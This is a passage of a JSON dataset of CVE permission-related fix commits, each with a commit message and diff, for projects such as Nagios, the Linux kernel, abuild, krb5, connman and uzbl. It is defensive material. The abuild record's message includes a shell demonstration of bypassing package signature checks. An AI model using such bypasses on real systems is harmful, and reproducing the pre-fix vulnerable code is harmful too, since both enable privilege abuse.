\n-\tumask(0);\n-\n \tsid = setsid();\n \tif (sid < 0)\n \t\texit(1);\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-12847","CWE_ID":"264","category":"security","commit_id":"1b197346d490df2e2d3b1dcce5ac6134ad0c8752","commit_message":"From 1b197346d490df2e2d3b1dcce5ac6134ad0c8752 Mon Sep 17 00:00:00 2001\nFrom: Bryan Heden <bheden@nagios.com>\nDate: Sun, 30 Jul 2017 16:28:11 -0500\nSubject: [PATCH] halfway revert hack\/configure changes - switch order of\n daemon_init\/drop_privileges\n\n---\n Changelog     |  2 ++\n THANKS        |  1 +\n base\/nagios.c | 31 ++++++++++++++++---------------\n configure.ac  | 10 ++--------\n 4 files changed, 21 insertions(+), 23 deletions(-)\n\n","diff_code":"diff --git a\/Changelog b\/Changelog\nindex a4a528ff..440a443f 100644\n--- a\/Changelog\n+++ b\/Changelog\n@@ -8,6 +8,8 @@ Nagios Core 4 Change Log\n * On-demand host check always use cached host state (John Frickson)\n * '\u00e1' causes Serivce Status Information to not be displayed (John Frickson)\n * New Macro(s) to generate URL for host \/ service object (John Frickson)\n+* Fix minor map issues (Troy Lea)\n+* Fix lockfile issues (Bryan Heden)\n \n \n 4.3.2 - 2017-05-09\ndiff --git a\/THANKS b\/THANKS\nindex 92fbf3e9..dddba66b 100644\n--- a\/THANKS\n+++ b\/THANKS\n@@ -320,6 +320,7 @@ wrong, please let me know.\n * Tomer Okavi\n * Ton Voon\n * Torsten Huebler\n+* Troy Lea\n * Tyler Lund\n * Uwe Knop\n * Uwe Knop\ndiff --git a\/base\/nagios.c b\/base\/nagios.c\nindex 26787002..6811aa6c 100644\n--- a\/base\/nagios.c\n+++ b\/base\/nagios.c\n@@ -592,6 +592,22 @@ int main(int argc, char **argv) {\n \t\t\tprogram_start = time(NULL);\n \t\t\tmy_free(mac->x[MACRO_PROCESSSTARTTIME]);\n \t\t\tasprintf(&mac->x[MACRO_PROCESSSTARTTIME], \"%llu\", (unsigned long long)program_start);\n+\t\t\t\n+\t\t\t\/* enter daemon mode (unless we're restarting...) *\/\n+\t\t\tif(daemon_mode == TRUE && sigrestart == FALSE) {\n+\n+\t\t\t\tresult = daemon_init();\n+\n+\t\t\t\t\/* we had an error daemonizing, so bail... *\/\n+\t\t\t\tif(result == ERROR) {\n+\t\t\t\t\tlogit(NSLOG_PROCESS_INFO | NSLOG_RUNTIME_ERROR, TRUE, \"Bailing out due to failure to daemonize. (PID=%d)\", (int)getpid());\n+\t\t\t\t\tcleanup();\n+\t\t\t\t\texit(EXIT_FAILURE);\n+\t\t\t\t\t}\n+\n+\t\t\t\t\/* get new PID *\/\n+\t\t\t\tnagios_pid = (int)getpid();\n+\t\t\t\t}\n \n \t\t\t\/* drop privileges *\/\n \t\t\tif(drop_privileges(nagios_user, nagios_group) == ERROR) {\n@@ -612,21 +628,6 @@ int main(int argc, char **argv) {\n \t\t\t\t\/* error has already been logged *\/\n \t\t\t\texit(EXIT_FAILURE);\n \t\t\t\t}\n-\t\t\t\/* enter daemon mode (unless we're restarting...) *\/\n-\t\t\tif(daemon_mode == TRUE && sigrestart == FALSE) {\n-\n-\t\t\t\tresult = daemon_init();\n-\n-\t\t\t\t\/* we had an error daemonizing, so bail... *\/\n-\t\t\t\tif(result == ERROR) {\n-\t\t\t\t\tlogit(NSLOG_PROCESS_INFO | NSLOG_RUNTIME_ERROR, TRUE, \"Bailing out due to failure to daemonize. (PID=%d)\", (int)getpid());\n-\t\t\t\t\tcleanup();\n-\t\t\t\t\texit(EXIT_FAILURE);\n-\t\t\t\t\t}\n-\n-\t\t\t\t\/* get new PID *\/\n-\t\t\t\tnagios_pid = (int)getpid();\n-\t\t\t\t}\n \n \t\t\t\/* this must be logged after we read config data, as user may have changed location of main log file *\/\n \t\t\tlogit(NSLOG_PROCESS_INFO, TRUE, \"Nagios %s starting... (PID=%d)\\n\", PROGRAM_VERSION, (int)getpid());\ndiff --git a\/configure.ac b\/configure.ac\nindex 15a0a6b0..c21ee0d1 100644\n--- a\/configure.ac\n+++ b\/configure.ac\n@@ -227,6 +227,7 @@ AC_ARG_WITH(checkresult-dir,\n if test x$CHECKRESULTDIR = xno; then\n \tCHECKRESULTDIR=\"$localstatedir\/spool\/checkresults\"\n fi \n+AC_SUBST(CHECKRESULTDIR)\n \n dnl Location of check result path\n TMPDIR=no\n@@ -270,7 +271,7 @@ AC_ARG_WITH(lockfile,\n \tlockfile=$withval,\n \tlockfile=$localstatedir\/nagios.lock\n )\n-\n+AC_SUBST(lockfile)\n \n dnl Determine the library to be used by the iobroker\n \n@@ -819,13 +820,6 @@ perl subst sample-config\/template-object\/printer.cfg\n perl subst sample-config\/template-object\/switch.cfg\n \n \n-\n-eval localstatedir=$localstatedir\n-eval lockfile=$lockfile\n-eval CHECKRESULTDIR=$CHECKRESULTDIR\n-AC_SUBST(CHECKRESULTDIR)\n-AC_SUBST(lockfile)\n-\n dnl Review options\n echo \"\"\n echo \"\"\n","owner":"NagiosEnterprises","repo":"nagioscore","source":"cve"},{"CVE_ID":"CVE-2010-0007","CWE_ID":"264","category":"security","commit_id":"dce766af541f6605fa9889892c0280bab31c66ab","commit_message":"From dce766af541f6605fa9889892c0280bab31c66ab Mon Sep 17 00:00:00 2001\nFrom: Florian Westphal <fwestphal@astaro.com>\nDate: Fri, 8 Jan 2010 17:31:24 +0100\nSubject: netfilter: ebtables: enforce CAP_NET_ADMIN\n\nnormal users are currently allowed to set\/modify ebtables rules.\nRestrict it to processes with CAP_NET_ADMIN.\n\nNote that this cannot be reproduced with unmodified ebtables binary\nbecause it uses SOCK_RAW.\n\nSigned-off-by: Florian Westphal <fwestphal@astaro.com>\nCc: stable@kernel.org\nSigned-off-by: Patrick McHardy <kaber@trash.net>\n---\n net\/bridge\/netfilter\/ebtables.c | 6 ++++++\n 1 file changed, 6 insertions(+)\n\n","diff_code":"diff --git a\/net\/bridge\/netfilter\/ebtables.c b\/net\/bridge\/netfilter\/ebtables.c\nindex bd1c65425d4f..0b7f262cd148 100644\n--- a\/net\/bridge\/netfilter\/ebtables.c\n+++ b\/net\/bridge\/netfilter\/ebtables.c\n@@ -1406,6 +1406,9 @@ static int do_ebt_set_ctl(struct sock *sk,\n {\n \tint ret;\n \n+\tif (!capable(CAP_NET_ADMIN))\n+\t\treturn -EPERM;\n+\n \tswitch(cmd) {\n \tcase EBT_SO_SET_ENTRIES:\n \t\tret = do_replace(sock_net(sk), user, len);\n@@ -1425,6 +1428,9 @@ static int do_ebt_get_ctl(struct sock *sk, int cmd, void __user *user, int *len)\n \tstruct ebt_replace tmp;\n \tstruct ebt_table *t;\n \n+\tif (!capable(CAP_NET_ADMIN))\n+\t\treturn -EPERM;\n+\n \tif (copy_from_user(&tmp, user, sizeof(tmp)))\n \t\treturn -EFAULT;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"935874141df839c706cd6cdc438e85eb69d1525e","commit_message":"From 935874141df839c706cd6cdc438e85eb69d1525e Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Tue, 24 Nov 2009 08:45:24 -0500\nSubject: fix pgoff in \"have to relocate\" case of mremap()\n\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mremap.c | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex 84efffb2d2c4..bbbbbf507ff3 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -495,7 +495,9 @@ unsigned long do_mremap(unsigned long addr,\n \t\t\tmap_flags |= MAP_SHARED;\n \n \t\tnew_addr = get_unmapped_area(vma->vm_file, 0, new_len,\n-\t\t\t\t\tvma->vm_pgoff, map_flags);\n+\t\t\t\t\tvma->vm_pgoff +\n+\t\t\t\t\t((addr - vma->vm_start) >> PAGE_SHIFT),\n+\t\t\t\t\tmap_flags);\n \t\tif (new_addr & ~PAGE_MASK) {\n \t\t\tret = new_addr;\n \t\t\tgoto out;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2019-12875","CWE_ID":"264","category":"security","commit_id":"4f90ce92778d0ee302e288def75591b96a397c8b","commit_message":"From 4f90ce92778d0ee302e288def75591b96a397c8b Mon Sep 17 00:00:00 2001\nFrom: Max Rees <maxcrees@me.com>\nDate: Thu, 13 Jun 2019 23:19:54 -0400\nSubject: [PATCH] abuild-sudo: don't allow --keys-dir\n\nNot allowing --allow-untrusted is obviously a good idea, but it can be\ntrivially bypassed if --keys-dir is allowed:\n\n$ abuild-apk add foo-1-r0.apk\nERROR: foo-1-r0.apk: UNTRUSTED signature\n$ abuild-apk --allow-untrusted add foo-1-r0.apk\nabuild-apk: --allow-untrusted: not allowed option\n$ cp -rp \/etc\/apk\/keys \/tmp\/keys\n$ cp untrusted.pub \/tmp\/keys\n$ abuild-apk --keys-dir \/tmp\/keys add foo-1-r0.apk\n(1\/1) Installing foo (1-r0)\nOK: 4319 MiB in 806 packages\n\nIf both --allow-untrusted and --keys-dir are not allowed, then it should\nno longer be possible for an unprivileged member of the abuild group to\nadd an untrusted package.\n\n$ abuild-apk --keys-dir \/tmp\/keys add foo-1-r0.apk\nabuild-apk: --keys-dir: not allowed option\n---\n abuild-sudo.c | 18 +++++++++++++++---\n 1 file changed, 15 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/abuild-sudo.c b\/abuild-sudo.c\nindex 80ceb8d7dd..12d64f13fd 100644\n--- a\/abuild-sudo.c\n+++ b\/abuild-sudo.c\n@@ -32,6 +32,12 @@ static const char* valid_cmds[] = {\n \tNULL\n };\n \n+static const char* invalid_opts[] = {\n+\t\"--allow-untrusted\",\n+\t\"--keys-dir\",\n+\tNULL,\n+};\n+\n const char *get_command_path(const char *cmd)\n {\n \tconst char *p;\n@@ -46,6 +52,14 @@ const char *get_command_path(const char *cmd)\n \treturn NULL;\n }\n \n+void check_option(const char *opt)\n+{\n+\tint i;\n+\tfor (i = 0; invalid_opts[i] != NULL; i++)\n+\t\tif (strcmp(opt, invalid_opts[i]) == 0)\n+\t\t\terrx(1, \"%s: not allowed option\", opt);\n+}\n+\n int is_in_group(gid_t group)\n {\n \tint ngroups_max = sysconf(_SC_NGROUPS_MAX) + 1;\n@@ -105,10 +119,8 @@ int main(int argc, const char *argv[])\n \tif (path == NULL)\n \t\terrx(1, \"%s: Not a valid subcommand\", cmd);\n \n-\t\/* we dont allow --allow-untrusted option *\/\n \tfor (i = 1; i < argc; i++)\n-\t\tif (strcmp(argv[i], \"--allow-untrusted\") == 0)\n-\t\t\terrx(1, \"%s: not allowed option\", \"--allow-untrusted\");\n+\t\tcheck_option(argv[i]);\n \n \targv[0] = path;\n \t\/* set our uid to root so bbsuid --install works *\/\n","owner":"sroracle","repo":"abuild","source":"cve"},{"CVE_ID":"CVE-2013-6431","CWE_ID":"264","category":"security","commit_id":"ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2","commit_message":"From ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2 Mon Sep 17 00:00:00 2001\nFrom: Daniel Borkmann <dborkman@redhat.com>\nDate: Sat, 7 Sep 2013 15:13:20 +0200\nSubject: [PATCH] net: fib: fib6_add: fix potential NULL pointer dereference\n\nWhen the kernel is compiled with CONFIG_IPV6_SUBTREES, and we return\nwith an error in fn = fib6_add_1(), then error codes are encoded into\nthe return pointer e.g. ERR_PTR(-ENOENT). In such an error case, we\nwrite the error code into err and jump to out, hence enter the if(err)\ncondition. Now, if CONFIG_IPV6_SUBTREES is enabled, we check for:\n\n  if (pn != fn && pn->leaf == rt)\n    ...\n  if (pn != fn && !pn->leaf && !(pn->fn_flags & RTN_RTINFO))\n    ...\n\nSince pn is NULL and fn is f.e. ERR_PTR(-ENOENT), then pn != fn\nevaluates to true and causes a NULL-pointer dereference on further\nchecks on pn. Fix it, by setting both NULL in error case, so that\npn != fn already evaluates to false and no further dereference\ntakes place.\n\nThis was first correctly implemented in 4a287eba2 (\"IPv6 routing,\nNLM_F_* flag support: REPLACE and EXCL flags support, warn about\nmissing CREATE flag\"), but the bug got later on introduced by\n188c517a0 (\"ipv6: return errno pointers consistently for fib6_add_1()\").\n\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nCc: Lin Ming <mlin@ss.pku.edu.cn>\nCc: Matti Vaittinen <matti.vaittinen@nsn.com>\nCc: Hannes Frederic Sowa <hannes@stressinduktion.org>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nAcked-by: Matti Vaittinen <matti.vaittinen@nsn.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv6\/ip6_fib.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/ipv6\/ip6_fib.c b\/net\/ipv6\/ip6_fib.c\nindex 73db48eba1c48..5bec666aba61d 100644\n--- a\/net\/ipv6\/ip6_fib.c\n+++ b\/net\/ipv6\/ip6_fib.c\n@@ -825,9 +825,9 @@ int fib6_add(struct fib6_node *root, struct rt6_info *rt, struct nl_info *info)\n \tfn = fib6_add_1(root, &rt->rt6i_dst.addr, rt->rt6i_dst.plen,\n \t\t\toffsetof(struct rt6_info, rt6i_dst), allow_create,\n \t\t\treplace_required);\n-\n \tif (IS_ERR(fn)) {\n \t\terr = PTR_ERR(fn);\n+\t\tfn = NULL;\n \t\tgoto out;\n \t}\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-2694","CWE_ID":"264","category":"security","commit_id":"e3b5a5e5267818c97750b266df50b6a3d4649604","commit_message":"From e3b5a5e5267818c97750b266df50b6a3d4649604 Mon Sep 17 00:00:00 2001\nFrom: Greg Hudson <ghudson@mit.edu>\nDate: Tue, 24 Mar 2015 12:02:37 -0400\nSubject: [PATCH] Prevent requires_preauth bypass [CVE-2015-2694]\n\nIn the OTP kdcpreauth module, don't set the TKT_FLG_PRE_AUTH bit until\nthe request is successfully verified.  In the PKINIT kdcpreauth\nmodule, don't respond with code 0 on empty input or an unconfigured\nrealm.  Together these bugs could cause the KDC preauth framework to\nerroneously treat a request as pre-authenticated.\n\nCVE-2015-2694:\n\nIn MIT krb5 1.12 and later, when the KDC is configured with PKINIT\nsupport, an unauthenticated remote attacker can bypass the\nrequires_preauth flag on a client principal and obtain a ciphertext\nencrypted in the principal's long-term key.  This ciphertext could be\nused to conduct an off-line dictionary attack against the user's\npassword.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:N\/C:P\/I:P\/A:N\/E:POC\/RL:OF\/RC:C\n\nticket: 8160 (new)\ntarget_version: 1.13.2\ntags: pullup\nsubject: requires_preauth bypass in PKINIT-enabled KDC [CVE-2015-2694]\n---\n src\/plugins\/preauth\/otp\/main.c          | 10 +++++++---\n src\/plugins\/preauth\/pkinit\/pkinit_srv.c |  4 ++--\n 2 files changed, 9 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/src\/plugins\/preauth\/otp\/main.c b\/src\/plugins\/preauth\/otp\/main.c\nindex bf9c6a89f6..7941b4aeee 100644\n--- a\/src\/plugins\/preauth\/otp\/main.c\n+++ b\/src\/plugins\/preauth\/otp\/main.c\n@@ -42,6 +42,7 @@ static krb5_preauthtype otp_pa_type_list[] =\n struct request_state {\n     krb5_kdcpreauth_verify_respond_fn respond;\n     void *arg;\n+    krb5_enc_tkt_part *enc_tkt_reply;\n };\n \n static krb5_error_code\n@@ -159,6 +160,9 @@ on_response(void *data, krb5_error_code retval, otp_response response)\n     if (retval == 0 && response != otp_response_success)\n         retval = KRB5_PREAUTH_FAILED;\n \n+    if (retval == 0)\n+        rs.enc_tkt_reply->flags |= TKT_FLG_PRE_AUTH;\n+\n     rs.respond(rs.arg, retval, NULL, NULL, NULL);\n }\n \n@@ -263,8 +267,6 @@ otp_verify(krb5_context context, krb5_data *req_pkt, krb5_kdc_req *request,\n     krb5_data d, plaintext;\n     char *config;\n \n-    enc_tkt_reply->flags |= TKT_FLG_PRE_AUTH;\n-\n     \/* Get the FAST armor key. *\/\n     armor_key = cb->fast_armor(context, rock);\n     if (armor_key == NULL) {\n@@ -298,12 +300,14 @@ otp_verify(krb5_context context, krb5_data *req_pkt, krb5_kdc_req *request,\n         goto error;\n     }\n \n-    \/* Create the request state. *\/\n+    \/* Create the request state.  Save the response callback, and the\n+     * enc_tkt_reply pointer so we can set the TKT_FLG_PRE_AUTH flag later. *\/\n     rs = k5alloc(sizeof(struct request_state), &retval);\n     if (rs == NULL)\n         goto error;\n     rs->arg = arg;\n     rs->respond = respond;\n+    rs->enc_tkt_reply = enc_tkt_reply;\n \n     \/* Get the principal's OTP configuration string. *\/\n     retval = cb->get_string(context, rock, \"otp\", &config);\ndiff --git a\/src\/plugins\/preauth\/pkinit\/pkinit_srv.c b\/src\/plugins\/preauth\/pkinit\/pkinit_srv.c\nindex b472741293..5b1d73e4a6 100644\n--- a\/src\/plugins\/preauth\/pkinit\/pkinit_srv.c\n+++ b\/src\/plugins\/preauth\/pkinit\/pkinit_srv.c\n@@ -301,7 +301,7 @@ pkinit_server_verify_padata(krb5_context context,\n \n     pkiDebug(\"pkinit_verify_padata: entered!\\n\");\n     if (data == NULL || data->length <= 0 || data->contents == NULL) {\n-        (*respond)(arg, 0, NULL, NULL, NULL);\n+        (*respond)(arg, EINVAL, NULL, NULL, NULL);\n         return;\n     }\n \n@@ -313,7 +313,7 @@ pkinit_server_verify_padata(krb5_context context,\n \n     plgctx = pkinit_find_realm_context(context, moddata, request->server);\n     if (plgctx == NULL) {\n-        (*respond)(arg, 0, NULL, NULL, NULL);\n+        (*respond)(arg, EINVAL, NULL, NULL, NULL);\n         return;\n     }\n \n","owner":"krb5","repo":"krb5","source":"cve"},{"CVE_ID":"CVE-2012-2320","CWE_ID":"264","category":"security","commit_id":"c1b968984212b46bea1330f5ae029507b9bfded9","commit_message":"From c1b968984212b46bea1330f5ae029507b9bfded9 Mon Sep 17 00:00:00 2001\nFrom: Jukka Rissanen <jukka.rissanen@linux.intel.com>\nDate: Thu, 3 May 2012 15:27:23 +0300\nSubject: inet: Make sure that we only accept netlink messages from kernel\n\n---\n src\/inet.c | 30 ++++++++++++++++++++----------\n 1 file changed, 20 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/src\/inet.c b\/src\/inet.c\nindex a0f69713..e01bfb38 100644\n--- a\/src\/inet.c\n+++ b\/src\/inet.c\n@@ -1991,27 +1991,37 @@ static int inet_rtnl_recv(GIOChannel *chan, gpointer user_data)\n \tstruct inet_rtnl_cb_data *rtnl_data = user_data;\n \tstruct __connman_inet_rtnl_handle *rth = rtnl_data->rtnl;\n \tstruct nlmsghdr *h = NULL;\n+\tstruct sockaddr_nl nladdr;\n+\tsocklen_t addr_len = sizeof(nladdr);\n \tunsigned char buf[4096];\n \tvoid *ptr = buf;\n \tgsize len;\n-\tint status;\n+\tint status, fd;\n \n \tmemset(buf, 0, sizeof(buf));\n+\tmemset(&nladdr, 0, sizeof(nladdr));\n \n-\tstatus = g_io_channel_read_chars(chan, (gchar *) buf,\n-\t\t\t\t\t\tsizeof(buf), &len, NULL);\n+\tfd = g_io_channel_unix_get_fd(chan);\n \n-\tDBG(\"status %d\", status);\n+\tstatus = recvfrom(fd, buf, sizeof(buf), 0,\n+                       (struct sockaddr *) &nladdr, &addr_len);\n+\tif (status < 0) {\n+\t\tif (errno == EINTR || errno == EAGAIN)\n+\t\t\treturn 0;\n \n-\tswitch (status) {\n-\tcase G_IO_STATUS_NORMAL:\n-\t\tbreak;\n-\tcase G_IO_STATUS_AGAIN:\n-\t\treturn 0;\n-\tdefault:\n \t\treturn -1;\n \t}\n \n+\tif (status == 0)\n+\t\treturn -1;\n+\n+\tif (nladdr.nl_pid != 0) { \/* not sent by kernel, ignore *\/\n+\t\tDBG(\"Received msg from %u, ignoring it\", nladdr.nl_pid);\n+\t\treturn 0;\n+\t}\n+\n+\tlen = status;\n+\n \twhile (len > 0) {\n \t\tstruct nlmsgerr *err;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"c4caa778157dbbf04116f0ac2111e389b5cd7a29","commit_message":"From c4caa778157dbbf04116f0ac2111e389b5cd7a29 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 08:38:43 -0500\nSubject: file ->get_unmapped_area() shouldn't duplicate work of\n get_unmapped_area()\n\n... we should call mm ->get_unmapped_area() instead and let our caller\ndo the final checks.\n\nAcked-by: David S. Miller <davem@davemloft.net>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/sparc\/kernel\/sys_sparc_64.c | 10 +++++++---\n ipc\/shm.c                        | 31 +++++++++++++++++--------------\n 2 files changed, 24 insertions(+), 17 deletions(-)\n\n","diff_code":"diff --git a\/arch\/sparc\/kernel\/sys_sparc_64.c b\/arch\/sparc\/kernel\/sys_sparc_64.c\nindex ddda12fcbac2..d498b32c75f6 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_64.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_64.c\n@@ -317,10 +317,14 @@ bottomup:\n unsigned long get_fb_unmapped_area(struct file *filp, unsigned long orig_addr, unsigned long len, unsigned long pgoff, unsigned long flags)\n {\n \tunsigned long align_goal, addr = -ENOMEM;\n+\tunsigned long (*get_area)(struct file *, unsigned long,\n+\t\t\t\t  unsigned long, unsigned long, unsigned long);\n+\n+\tget_area = current->mm->get_unmapped_area;\n \n \tif (flags & MAP_FIXED) {\n \t\t\/* Ok, don't mess with it. *\/\n-\t\treturn get_unmapped_area(NULL, orig_addr, len, pgoff, flags);\n+\t\treturn get_area(NULL, orig_addr, len, pgoff, flags);\n \t}\n \tflags &= ~MAP_SHARED;\n \n@@ -333,7 +337,7 @@ unsigned long get_fb_unmapped_area(struct file *filp, unsigned long orig_addr, u\n \t\talign_goal = (64UL * 1024);\n \n \tdo {\n-\t\taddr = get_unmapped_area(NULL, orig_addr, len + (align_goal - PAGE_SIZE), pgoff, flags);\n+\t\taddr = get_area(NULL, orig_addr, len + (align_goal - PAGE_SIZE), pgoff, flags);\n \t\tif (!(addr & ~PAGE_MASK)) {\n \t\t\taddr = (addr + (align_goal - 1UL)) & ~(align_goal - 1UL);\n \t\t\tbreak;\n@@ -351,7 +355,7 @@ unsigned long get_fb_unmapped_area(struct file *filp, unsigned long orig_addr, u\n \t * be obtained.\n \t *\/\n \tif (addr & ~PAGE_MASK)\n-\t\taddr = get_unmapped_area(NULL, orig_addr, len, pgoff, flags);\n+\t\taddr = get_area(NULL, orig_addr, len, pgoff, flags);\n \n \treturn addr;\n }\ndiff --git a\/ipc\/shm.c b\/ipc\/shm.c\nindex 464694e0aa4a..11bec626c228 100644\n--- a\/ipc\/shm.c\n+++ b\/ipc\/shm.c\n@@ -290,28 +290,28 @@ static unsigned long shm_get_unmapped_area(struct file *file,\n \tunsigned long flags)\n {\n \tstruct shm_file_data *sfd = shm_file_data(file);\n-\treturn get_unmapped_area(sfd->file, addr, len, pgoff, flags);\n-}\n-\n-int is_file_shm_hugepages(struct file *file)\n-{\n-\tint ret = 0;\n-\n-\tif (file->f_op == &shm_file_operations) {\n-\t\tstruct shm_file_data *sfd;\n-\t\tsfd = shm_file_data(file);\n-\t\tret = is_file_hugepages(sfd->file);\n-\t}\n-\treturn ret;\n+\treturn sfd->file->f_op->get_unmapped_area(sfd->file, addr, len,\n+\t\t\t\t\t\tpgoff, flags);\n }\n \n static const struct file_operations shm_file_operations = {\n \t.mmap\t\t= shm_mmap,\n \t.fsync\t\t= shm_fsync,\n \t.release\t= shm_release,\n+};\n+\n+static const struct file_operations shm_file_operations_huge = {\n+\t.mmap\t\t= shm_mmap,\n+\t.fsync\t\t= shm_fsync,\n+\t.release\t= shm_release,\n \t.get_unmapped_area\t= shm_get_unmapped_area,\n };\n \n+int is_file_shm_hugepages(struct file *file)\n+{\n+\treturn file->f_op == &shm_file_operations_huge;\n+}\n+\n static const struct vm_operations_struct shm_vm_ops = {\n \t.open\t= shm_open,\t\/* callback for a new vm-area open *\/\n \t.close\t= shm_close,\t\/* callback for when the vm-area is released *\/\n@@ -889,7 +889,10 @@ long do_shmat(int shmid, char __user *shmaddr, int shmflg, ulong *raddr)\n \tif (!sfd)\n \t\tgoto out_put_dentry;\n \n-\tfile = alloc_file(path.mnt, path.dentry, f_mode, &shm_file_operations);\n+\tfile = alloc_file(path.mnt, path.dentry, f_mode,\n+\t\t\tis_file_hugepages(shp->shm_file) ?\n+\t\t\t\t&shm_file_operations_huge :\n+\t\t\t\t&shm_file_operations);\n \tif (!file)\n \t\tgoto out_free;\n \tima_counts_get(file);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-0011","CWE_ID":"264","category":"security","commit_id":"1958b52d41cba96956dc1995660de49525ed1047","commit_message":"From 1958b52d41cba96956dc1995660de49525ed1047 Mon Sep 17 00:00:00 2001\nFrom: Dieter Plaetinck <dieter@plaetinck.be>\nDate: Tue, 5 Jan 2010 20:17:29 +0100\nSubject: [PATCH] disable Uzbl javascript object because of security problem.\n\n---\n README               | 21 +--------------------\n tests\/test-command.c |  5 -----\n uzbl-core.c          | 10 ----------\n 3 files changed, 1 insertion(+), 35 deletions(-)\n\n","diff_code":"diff --git a\/README b\/README\nindex 0d6ed0463..a22e10593 100644\n--- a\/README\n+++ b\/README\n@@ -397,7 +397,7 @@ The script specific arguments are this:\n \n Custom, userdefined scripts (`spawn foo bar`) get first the arguments as specified in the config and then the above 7 are added at the end.\n \n-### JAVASCRIPT HELPER OBJECT\n+### JAVASCRIPT HELPER OBJECT DISABLED BECAUSE OF SECURITY LEAK\n \n Javascript code run from uzbl is given a special object in the global namespace which gives special privileges to these scripts. This object is called `Uzbl`, and it is added and removed before and after the script execution so that it is hidden to web javascripts (There is no race condition, since all the javascript code runs in a single thread)\n \n@@ -410,25 +410,6 @@ Currently, the `Uzbl` object provides only one function:\n        * `Uzbl.run(\"spawn insert_bookmark.sh\")`\n        * `uri = Uzbl.run(\"print @uri\")` (see variable expansion below)\n \n-### JAVASCRIPT SECURITY\n-\n-Since defined variables and functions are set in the global namespace (`window` object) as default, it is recommended to wrap your scripts like this:\n-\n-    (function(Uzbl) {\n-        ...\n-    })(Uzbl);\n-\n-This way, everything is kept private. It also turns Uzbl into a local variable, which can be accessed from callback functions defined inside. However for some situations, isolating everything isn't an option, for example, with binds. You can define them directly in the script body, and use `var Uzbl = window.Uzbl;` to make the Uzbl variable local, as in the following example:\n-\n-    function f() {\n-        var Uzbl = window.Uzbl;\n-        Uzbl.run(...);\n-        setTimeout(function() {\n-            Uzbl.run(...);\n-        }, 500);\n-    }\n-\n-Copying the Uzbl object and creating public functions should be taken with care to avoid creating security holes. Keep in mind that the \"f\" function above would be defined in the `window` object, and as such any javascript in the current page can call it.\n \n ### EVENTS ###\n \ndiff --git a\/tests\/test-command.c b\/tests\/test-command.c\nindex 49f3bb829..fc3b092ea 100644\n--- a\/tests\/test-command.c\n+++ b\/tests\/test-command.c\n@@ -305,11 +305,6 @@ test_js (void) {\n     parse_cmd_line(\"js ('x' + 345).toUpperCase()\", result);\n     g_assert_cmpstr(\"X345\", ==, result->str);\n \n-    \/* uzbl commands can be run from javascript *\/\n-    uzbl.net.useragent = \"Test useragent\";\n-    parse_cmd_line(\"js Uzbl.run('print @useragent').toUpperCase();\", result);\n-    g_assert_cmpstr(\"TEST USERAGENT\", ==, result->str);\n-\n     g_string_free(result, TRUE);\n }\n \ndiff --git a\/uzbl-core.c b\/uzbl-core.c\nindex fd8ee4174..fca293c1f 100644\n--- a\/uzbl-core.c\n+++ b\/uzbl-core.c\n@@ -1046,7 +1046,6 @@ eval_js(WebKitWebView * web_view, gchar *script, GString *result) {\n     WebKitWebFrame *frame;\n     JSGlobalContextRef context;\n     JSObjectRef globalobject;\n-    JSStringRef var_name;\n \n     JSStringRef js_script;\n     JSValueRef js_result;\n@@ -1059,12 +1058,6 @@ eval_js(WebKitWebView * web_view, gchar *script, GString *result) {\n     context = webkit_web_frame_get_global_context(frame);\n     globalobject = JSContextGetGlobalObject(context);\n \n-    \/* uzbl javascript namespace *\/\n-    var_name = JSStringCreateWithUTF8CString(\"Uzbl\");\n-    JSObjectSetProperty(context, globalobject, var_name,\n-                        JSObjectMake(context, uzbl.js.classref, NULL),\n-                        kJSClassAttributeNone, NULL);\n-\n     \/* evaluate the script and get return value*\/\n     js_script = JSStringCreateWithUTF8CString(script);\n     js_result = JSEvaluateScript(context, js_script, globalobject, NULL, 0, NULL);\n@@ -1082,9 +1075,6 @@ eval_js(WebKitWebView * web_view, gchar *script, GString *result) {\n     }\n \n     \/* cleanup *\/\n-    JSObjectDeleteProperty(context, globalobject, var_name, NULL);\n-\n-    JSStringRelease(var_name);\n     JSStringRelease(js_script);\n }\n \n","owner":"Dieterbe","repo":"uzbl","source":"cve"},{"CVE_ID":"CVE-2011-1833","CWE_ID":"264","category":"security","commit_id":"764355487ea220fdc2faf128d577d7f679b91f97","commit_message":"From 764355487ea220fdc2faf128d577d7f679b91f97 Mon Sep 17 00:00:00 2001\nFrom: John Johansen 